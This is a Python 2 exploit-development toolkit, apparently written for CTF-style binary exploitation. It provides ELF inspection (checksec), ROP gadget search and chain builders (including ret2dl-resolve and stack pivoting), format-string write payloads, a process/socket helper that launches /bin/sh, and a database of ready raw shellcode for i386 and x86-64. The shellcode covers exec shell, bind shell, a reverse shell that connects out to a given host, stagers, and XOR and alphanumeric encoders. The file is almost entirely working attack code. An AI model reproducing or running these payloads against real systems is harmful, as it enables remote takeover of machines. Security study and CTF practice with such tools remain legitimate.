#!/usr/bin/env python

import sys
import os
import re
import struct
import socket
import time
import fcntl
import select
import errno
import random
from telnetlib import Telnet
from subprocess import Popen, PIPE


def p32(x):
    if isinstance(x, str):
        return struct.unpack_from('<I', x)[0]
    else:
        return struct.pack('<I', x)

def p64(x):
    if isinstance(x, str):
        return struct.unpack_from('<Q', x)[0]
    else:
        return struct.pack('<Q', x)


class ELF:
    def __init__(self, fpath, base=0):
        self.fpath = fpath
        self.base = base
        self.sec = dict(relro=False, bind_now=False, stack_canary=False, nx=False, pie=False, rpath=False, runpath=False, dt_debug=False)

        if not os.path.exists(fpath):
            raise Exception("file not found: %r" % fpath)

        self._dynamic = {}
        self._section = {}
        p = Popen(['objdump', '-x', fpath], stdout=PIPE)
        line = ''
        while True:  # read ELF header
            line = p.stdout.readline()
            if line == 'Program Header:\n':
                break
            if 'DYNAMIC' in line:
                self.sec['pie'] = True
            field = line.split()
            if len(field) != 4:
                continue
            if field[2] != 'format':
                continue
            if field[3] == 'elf64-x86-64':
                self.wordsize = 8
            elif field[3] == 'elf32-i386':
                self.wordsize = 4
            else:
                raise Exception('unsupported format: %s' % field[3])
        while True:  # read Program Header
            line = p.stdout.readline()
            field = line.split()
            line = p.stdout.readline()
            if line == 'Dynamic Section:\n':
                break
            field.extend(line.split())
            if len(field) != 15:
                continue
            name, offset, vaddr, filesz, flag = field[0], int(field[2], 16), int(field[4], 16), int(field[10], 16), field[14]
            if name == 'RELRO':
                self.sec['relro'] = True
            elif name == 'STACK':
                if not 'x' in flag:
                    self.sec['nx'] = True
            elif name == 'LOAD':
                if not 'x' in flag:
                    continue
                with open(fpath, 'rb') as f:
                    f.seek(offset)
                    blob = f.read(filesz)
                self.xmem = (vaddr, blob)
        while True:  # read Dynamic Section
            line = p.stdout.readline()
            if line == 'Sections:\n':
                break
            field = line.split()
            if len(field) != 2:
                continue
            if field[1].endswith(':'):
                continue
            name, value = field[0], field[1]
            if name in ('NEEDED', 'SONAME'):
                ary = self._dynamic.setdefault(name, [])
                ary.append(value)
            else:
                self._dynamic[name] = int(value, 16)
                if name == 'BIND_NOW':
                    self.sec['bind_now'] = True
                elif name == 'RPATH':
                    self.sec['rpath'] = True
                elif name == 'RUNPATH':
                    self.sec['runpath'] = True
                elif name == 'DEBUG':
                    self.sec['dt_debug'] = True
        while True:  # read Sections
            line = p.stdout.readline()
            if line == 'SYMBOL TABLE:\n':
                break
            field = line.split()
            if len(field) != 7:
                continue
            name, addr = field[1], int(field[3], 16)
            self._section[name] = addr
        p.terminate()

        self._got = {}
        self._plt = {}
        idx = 0
        p = Popen(['objdump', '-R', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 3:
                continue
            if not 'JUMP_SLOT' in field[1]:
                continue
            name, addr = field[2], int(field[0], 16)
            self._got[name] = addr
            self._plt[name] = self._section['.plt'] + 0x10*(idx+1)
            if name == '__stack_chk_fail':
                self.sec['stack_canary'] = True
            idx += 1
        p.terminate()

        self._symbol = {}
        p = Popen(['objdump', '-T', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 7:
                continue
            name, addr = field[6], int(field[0], 16)
            self._symbol[name] = addr
        p.terminate()

        self._string = {}
        p = Popen(['strings', '-tx', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 2:
                continue
            name, addr = field[1], int(field[0], 16)
            self._string[name] = addr
        p.terminate()

    def p(self, x):
        if self.wordsize == 8:
            return p64(x)
        else:
            return p32(x)

    def set_base(self, addr, name='__libc_start_main'):
        self.base = addr - self._symbol[name]

    def section(self, name):
        return self.base + self._section[name]

    def dynamic(self, name):
        return self.base + self._dynamic[name]

    def got(self, name=None):
        if name:
            return self.base + self._got[name]
        else:
            return self.dynamic('PLTGOT')

    def plt(self, name=None):
        if name:
            return self.base + self._plt[name]
        else:
            return self.base + self._section['.plt']

    def addr(self, name):
        return self.base + self._symbol[name]

    def str(self, name):
        return self.base + self._string[name]

    def gadget(self, keyword, reg=None, n=1, xmem=None):
        if xmem:
            addr, blob = xmem
        else:
            addr, blob = self.xmem
            addr += self.base

        regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi']
        if reg:
            if not (len(reg) == 3 and reg[0] in ('r', 'e')):
                raise Exception("unexpected register: %r" % reg)
            r = regs.index('r'+reg[1:])
        else:
            r = 4

        if keyword == 'pop':
            if reg:
                chunk = chr(0x58+r) + '\xc3'
                return addr + blob.index(chunk)
            else:
                # skip rsp
                m = re.search(r"[\x58-\x5b\x5d-\x5f]{%d}\xc3" % n, blob)
                return addr + m.start()
        elif keyword == 'jmp':
            chunk = '\xff' + chr(0xe0+r)
            return addr + blob.index(chunk)
        elif keyword == 'call':
            chunk = '\xff' + chr(0xd0+r)
            return addr + blob.index(chunk)
        elif keyword == 'push':
            chunk = chr(0x50+r) + '\xc3'
            return addr + blob.index(chunk)
        elif keyword == 'pivot':
            # xchg reg, esp
            if r == 0:
                return addr + blob.index('\x94\xc3')
            else:
                chunk = '\x87' + chr(0xe0+r) + '\xc3'
                try:
                    return addr + blob.index(chunk)
                except ValueError:
                    pass
                chunk = '\x87' + chr(0xc4+8*r) + '\xc3'
                return addr + blob.index(chunk)
        elif keyword == 'pushad':
            # x86 only
            return addr + blob.index('\x60\xc3')
        elif keyword == 'popad':
            # x86 only
            return addr + blob.index('\x61\xc3')
        elif keyword == 'leave':
            return addr + blob.index('\xc9\xc3')
        elif keyword == 'ret':
            return addr + blob.index('\xc3')
        elif keyword == 'int3':
            return addr + blob.index('\xcc')
        elif keyword == 'int0x80':
            return addr + blob.index('\xcd\x80')
        elif keyword == 'call_gs':
            return addr + blob.index('\x65\xff\x15\x10\x00\x00\x00')
        elif keyword == 'syscall':
            return addr + blob.index('\x0f\x05')
        else:
            # arbitary chunk
            return addr + blob.index(keyword)

    def checksec(self):
        ary = []

        if self.sec['relro']:
            if self.sec['bind_now']:
                ary.append('\033[32mFull RELRO   \033[m   ')
            else:
                ary.append('\033[33mPartial RELRO\033[m   ')
        else:
            ary.append('\033[31mNo RELRO     \033[m   ')

        if self.sec['stack_canary']:
            ary.append('\033[32mCanary found   \033[m   ')
        else:
            ary.append('\033[31mNo canary found\033[m   ')

        if self.sec['nx']:
            ary.append('\033[32mNX enabled \033[m   ')
        else:
            ary.append('\033[31mNX disabled\033[m   ')

        if self.sec['pie']:
            ary.append('\033[32mPIE enabled  \033[m   ')
        else:
            ary.append('\033[31mNo PIE       \033[m   ')

        if self.sec['rpath']:
            ary.append('\033[31mRPATH    \033[m  ')
        else:
            ary.append('\033[32mNo RPATH \033[m  ')

        if self.sec['runpath']:
            ary.append('\033[31mRUNPATH    \033[m  ')
        else:
            ary.append('\033[32mNo RUNPATH \033[m  ')

        ary.append(self.fpath)

        print "RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE"
        print ''.join(ary)

    def list_gadgets(self):
        regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi']

        print "%8s" % 'pop',
        for i in range(6):
            try:
                self.gadget('pop', n=i+1)
                print "\033[32m%d\033[m" % (i+1),
            except AttributeError:
                print "\033[31m%d\033[m" % (i+1),
        print

        for keyword in ['pop', 'jmp', 'call', 'push', 'pivot']:
            print "%8s" % keyword,
            for reg in regs:
                try:
                    self.gadget(keyword, reg)
                    print "\033[32m%s\033[m" % reg,
                except ValueError:
                    print "\033[31m%s\033[m" % reg,
            print

        print "%8s" % 'etc',
        for keyword in ['pushad', 'popad', 'leave', 'ret', 'int3', 'int0x80', 'call_gs', 'syscall']:
            try:
                self.gadget(keyword)
                print "\033[32m%s\033[m" % keyword,
            except ValueError:
                print "\033[31m%s\033[m" % keyword,
        print


class ROP(ELF):
    def call(self, addr, *args):
        if len(args) > 4:
            raise Exception("over 4 args is unsupported: %d" % len(args))

        if self.wordsize == 8:
            regs = ['rdi', 'rsi', 'rdx', 'rcx']
            buf = ''
            for i, arg in enumerate(args):
                buf += self.p(self.gadget('pop', regs[i]))
                buf += self.p(arg)
            buf += self.p(addr)
            return buf
        else:
            buf = self.p(addr)
            buf += self.p(self.gadget('pop', n=len(args)))
            for arg in args:
                buf += self.p(arg)
            return buf

    def call_plt(self, name, *args):
        return self.call(self.plt(name), *args)

    def call_chain_ptr(self, *calls, **kwargs):
        if self.wordsize != 8:
            raise Exception('support x86-64 only')

        chunk_candidates = [
            # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc (Ubuntu/Linaro 4.8.2-19ubuntu1) 4.8.2
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', True),
            # gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-4)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x72\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
        ]

        for chunk1, chunk2, _args_reversed in chunk_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_r12 = self.gadget(chunk1 + chunk2)
                args_reversed = _args_reversed
                break
            except ValueError:
                pass

        buf = p64(set_regs)

        for args in calls:
            ptr = args.pop(0)
            buf += self.junk()
            buf += p64(0) + p64(1) + p64(ptr)
            if not args_reversed:
                for arg in args:
                    buf += p64(arg)
                buf += self.junk(3-len(args))
            else:
                buf += self.junk(3-len(args))
                for arg in reversed(args):
                    buf += p64(arg)
            buf += p64(call_r12)

        buf += self.junk()
        if 'pivot' in kwargs:
            buf += p64(0)
            buf += p64(kwargs['pivot'])
            buf += p64(0) * 4
            buf += p64(self.gadget('leave'))
        else:
            buf += p64(0) * 6
        return buf

    def call_chain_plt(self, *calls, **kwargs):
        ary = []
        for call in calls:
            ary.append([self.got(call[0])] + call[1:])
        return self.call_chain_ptr(*ary, **kwargs)

    def dl_resolve(self, base, name, *args, **kwargs):
        def align(x, origin=0, size=0):
            pad = size - ((x-origin) % size)
            return (x+pad, pad)

        if self.wordsize == 8:
            jmprel = self.dynamic('JMPREL')
            relaent = self.dynamic('RELAENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            # prerequisite:
            # 1) overwrite (link_map + 0x1c8) with NULL
            # 2) set registers for arguments
            addr_reloc, pad_reloc = align(base + self.wordsize*3, jmprel, relaent)
            addr_sym, pad_sym = align(addr_reloc + 0x18, symtab, syment)
            addr_symstr = addr_sym + syment

            reloc_offset = (addr_reloc - jmprel) / relaent
            r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
            st_name = addr_symstr - strtab

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            if 'retaddr' in kwargs:
                buf += self.p(kwargs['retaddr'])
            else:
                buf += self.junk()
            buf += self.fill(pad_reloc)
            buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
            buf += self.fill(pad_sym)
            buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
            buf += self.string(name)
        else:
            jmprel = self.dynamic('JMPREL')
            relent = self.dynamic('RELENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            addr_reloc = base + self.wordsize*(3+len(args))
            addr_sym, pad_sym = align(addr_reloc+relent, symtab, syment)
            addr_symstr = addr_sym + syment

            reloc_offset = addr_reloc - jmprel
            r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
            st_name = addr_symstr - strtab

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            if 'retaddr' in kwargs:
                buf += self.p(kwargs['retaddr'])
            else:
                buf += self.junk()
            for arg in args:
                buf += self.p(arg)
            buf += struct.pack('<II', self.section('.bss'), r_info)  # Elf32_Rel
            buf += self.fill(pad_sym)
            buf += struct.pack('<IIII', st_name, 0, 0, 0x12)         # Elf32_Sym
            buf += self.string(name)

        return buf

    def dynamic_syscall(self, addr, data, number, *args):
        xmem = (addr, data)

        if self.wordsize == 8:
            arg_regs = ['rdi', 'rsi', 'rdx', 'rcx']

            buf = self.p(self.gadget('pop', 'rax', xmem=xmem)) + self.p(number)
            for i, arg in enumerate(args):
                buf += self.p(self.gadget('pop', arg_regs[i], xmem=xmem)) + self.p(arg)
            buf += self.p(self.gadget('syscall', xmem=xmem))
        else:
            args = list(args) + [0] * (6-len(args))
            buf = self.p(self.gadget('popad', xmem=xmem)) + struct.pack('<IIIIIIII', args[4], args[3], args[5], 0, args[0], args[2], args[1], number)
            buf += self.p(self.gadget('int0x80', xmem=xmem))
        return buf

    def pivot(self, rsp):
        buf = self.p(self.gadget('pop', 'rbp'))
        buf += self.p(rsp - self.wordsize)
        buf += self.p(self.gadget('leave'))
        return buf

    def string(self, s):
        return s + '\x00'

    def junk(self, n=1):
        return self.fill(self.wordsize * n)

    def fill(self, size, buf=''):
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        buflen = size - len(buf)
        buf = bytearray()
        while len(buf) < buflen:
            buf += random.choice(chars)
        return buf[:buflen]


class Shellcode:
    _database = {
        'i386': {
            '_noppairs': ['AI', 'BJ', 'CK', 'FN', 'GO'],
            'exec_shell': "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80",
            'read_stager': "\xeb\x10\x59\x31\xdb\x8d\x53\x01\xc1\xe2\x0c\x8d\x43\x03\xcd\x80\xeb\x05\xe8\xeb\xff\xff\xff",
            'mmap_stager': "\x31\xc9\x8d\x51\x01\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\x8d\x41\x5a\xcd\x80\x89\xcb\x89\xc1\x8d\x43\x03\xcd\x80\xff\xe1",
            '_cat': "\xeb\x23\x58\x31\xd2\x8d\x48\x01\x89\xce\x02\x08\x88\x11\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x53\x89\xe1\x8d\x42\x0b\xcd\x80\xe8\xd8\xff\xff\xff",
            '_dup': "\x31\xd2\x8d\x5a${fd}\x8d\x4a\x02\x8d\x42\x3f\xcd\x80\x49\x79\xf8",
            '_bind_shell': "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00${port}\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
            '_reverse_shell': "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68${host}\x68\x02\x00${port}\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",
            '_xor_decoder': "\xeb\x09\x59\x80\x31${key}\x74\x08\x41\xeb\xf8\xe8\xf2\xff\xff\xff",
        },
        'x86-64': {
            '_noppairs': ['PX', 'QY', 'RZ'],
            'exec_shell': "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05",
            'read_stager': "\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xeb\x05\xe8\xe8\xff\xff\xff",
            'mmap_stager': "\x4d\x31\xc9\x4d\x8d\x41\xff\x4d\x8d\x51\x22\x49\x8d\x51\x07\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x4c\x89\xcf\x49\x8d\x41\x09\x0f\x05\x48\x89\xf2\x48\x89\xc6\x4c\x89\xc8\x0f\x05\xff\xe6",
            '_cat': "\xeb\x2a\x58\x48\x31\xd2\x48\x8d\x48\x01\x48\x89\xce\x02\x08\x88\x11\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x63\x61\x74\x50\x48\x89\xe7\x52\x56\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05\xe8\xd1\xff\xff\xff",
            '_dup': "\x48\x31\xd2\x48\x8d\x7a${fd}\x48\x8d\x72\x02\x48\x8d\x42\x21\x0f\x05\x48\xff\xce\x79\xf5",
            '_bind_shell': "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\xc7\x04\x24\x02\x00${port}\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05",
            '_reverse_shell': "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00${port}${host}\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05",
            '_xor_decoder': "\xeb\x0b\x59\x80\x31${key}\x74\x0a\x48\xff\xc1\xeb\xf6\xe8\xf0\xff\xff\xff",
        }
    }

    def __init__(self, arch):
        if arch not in self._database:
            raise Exception("unsupported architechture: %r" % arch)
        self.arch = arch

    def get(self, name):
        if name not in self._database[self.arch]:
            raise Exception("unsupported shellcode for this architechture: %r" % name)
        return self._database[self.arch][name]

    def nopfill(self, name, size, buf=''):
        code = self.get(name)
        noplen = size - len(buf) - len(code)
        buf = bytearray()
        while len(buf) < noplen:
            buf += random.choice(self.get('_noppairs'))
        return str(buf[:noplen] + code)

    def cat(self, fpath):
        return self.get('_cat') + chr(len(fpath)) + fpath

    def dup(self, name, fd):
        if fd > 0x7f:
            raise Exception("fd over 0x7f is unsupported: %d" % fd)

        return self.get('_dup').replace('${fd}', chr(fd)) + self.get(name)

    def bind_shell(self, port):
        p = struct.pack('>H', port)
        return self.get('_bind_shell').replace('${port}', p)

    def reverse_shell(self, host, port):
        h = socket.inet_aton(host)
        p = struct.pack('>H', port)
        return self.get('_reverse_shell').replace('${host}', h).replace('${port}', p)

    def xor(self, name, key=0xff):
        decoder = self.get('_xor_decoder').replace('${key}', chr(key))
        return decoder + ''.join(chr(ord(x)^key) for x in self.get(name)) + chr(key)

    def alnum(self, name, reg=None):
        if self.arch != 'i386':
            raise Exception("unsupported architechture: %r" % self.arch)

        chars = range(0x30,0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b)
        pairs = [(y, z) for y in chars for z in chars]
        regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

        data = '\xf0' + self.get(name) + '\x00'
        encoded = [0x30]

        for i, c in enumerate(data):
            original_byte = ord(c)
            x = encoded[i]
            for y, z in pairs:
                if (x^(y*0x30)^z) & 0xFF == original_byte:
                    encoded += [y, z]
                    break
            else:
                raise Exception("something wrong: %02x" % original_byte)

        if reg:
            try:
                r = regs.index(reg.lower())
            except ValueError:
                raise Exception("unsupported register: %s" % reg)

            # push reg; pop ecx
            buf = chr(0x50+r) + 'Y'
        else:
            # set ecx by using call
            buf = '\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xffYF'

        buf += 'h3333k4dsFkDqG02DqH0D10u' + str(bytearray(encoded))
        return buf


class FormatStr:
    def __init__(self, offset=0):
        # x86 only
        self.offset = offset

    def dump_stack(self, size, start=1):
        buf = 'AAAA'
        i = start
        while len(buf) < size:
            buf += ".%%%d$08x" % i
            i += 1
        return buf[:size]

    def gets(self, addr):
        buf = struct.pack('<I', addr)
        buf += "%%%d$s" % self.offset
        return buf

    def write4(self, addr, value):
        buf = struct.pack('<IIII', addr, addr+1, addr+2, addr+3)

        n = map(ord, struct.pack('<I', value))
        n[3] = ((n[3]-n[2]-1) % 0x100) + 1
        n[2] = ((n[2]-n[1]-1) % 0x100) + 1
        n[1] = ((n[1]-n[0]-1) % 0x100) + 1
        n[0] = ((n[0]-len(buf)-1) % 0x100) + 1

        buf += '%%%dc%%%d$hhn' % (n[0], self.offset)
        buf += '%%%dc%%%d$hhn' % (n[1], self.offset+1)
        buf += '%%%dc%%%d$hhn' % (n[2], self.offset+2)
        buf += '%%%dc%%%d$hhn' % (n[3], self.offset+3)

        return buf


class Proc:
    def __init__(self, *args, **kwargs):
        if 'host' in kwargs and 'port' in kwargs:
            self.p = socket.create_connection((kwargs['host'], kwargs['port']))
        else:
            self.p = Popen(args, stdin=PIPE, stdout=PIPE)
            fd = self.p.stdout.fileno()
            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

    def write(self, s):
        time.sleep(0.1)
        if isinstance(self.p, Popen):
            return self.p.stdin.write(s)
        else:
            return self.p.sendall(s)

    def read(self, size):
        if isinstance(self.p, Popen):
            rlist, wlist, xlist = select.select([self.p.stdout], [], [], 0.1)
            if rlist:
                return self.p.stdout.read(size)
            else:
                return ''
        else:
            return self.p.recv(size)

    def interact(self):
        if isinstance(self.p, Popen):
            while True:
                buf = self.read(1024)
                sys.stdout.write(buf)
                if len(buf) < 1024:
                    break
            try:
                self.write('exec /bin/sh <&2 >&2\n')
            except IOError as e:
                if e.errno == errno.EPIPE:  # Broken pipe
                    return
                else:
                    raise
            self.p.wait()
        else:
            t = Telnet()
            t.sock = self.p
            t.interact()
            t.close()

    def close(self):
        if isinstance(self.p, Popen):
            self.p.terminate()
        else:
            self.p.close()

    def strings(self, n=4):
        if isinstance(self.p, Popen):
            p_stdout = self.p.stdout
        else:
            p_stdout = self.p.makefile()
        p = Popen(['strings', '-tx', '-n', str(n)], stdin=p_stdout, stdout=PIPE)
        stdout, stderr = p.communicate()
        return stdout

    def write_p64(self, s):
        return self.write(p64(s))

    def write_p32(self, s):
        return self.write(p32(s))

    def read_p64(self):
        return p64(self.read(8))

    def read_p32(self):
        return p32(self.read(4))


class Pattern:
    @classmethod
    def generate(self):
        for x in xrange(0x41, 0x5b):
            for y in xrange(0x61, 0x7b):
                for z in xrange(0x30, 0x3a):
                    yield "%c%c%c" % (x, y, z)

    @classmethod
    def create(cls, size):
        s = ''
        for x in cls.generate():
            s += x
            if len(s) >= size:
                return s[:size]
        else:
            raise Exception("size too large")

    @classmethod
    def offset(cls, addr):
        if addr >> 32:
            chunk = p64(addr)
        else:
            chunk = p32(addr)

        s = ''
        for x in cls.generate():
            s += x
            if chunk in s:
                return s.index(chunk)
        else:
            raise Exception("pattern not found")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print >>sys.stderr, "Usage: python %s [checksec|create|offset|gadget] ..." % sys.argv[0]
        sys.exit(1)
    cmd = sys.argv[1]
    if cmd == 'checksec':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).checksec()
    elif cmd == 'create':
        size = int(sys.argv[2]) if len(sys.argv) > 2 else 200
        print Pattern.create(size)
    elif cmd == 'offset':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s offset ADDRESS" % sys.argv[0]
            sys.exit(1)
        addr = int(sys.argv[2], 16)
        print Pattern.offset(addr)
    elif cmd == 'gadget':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).list_gadgets()
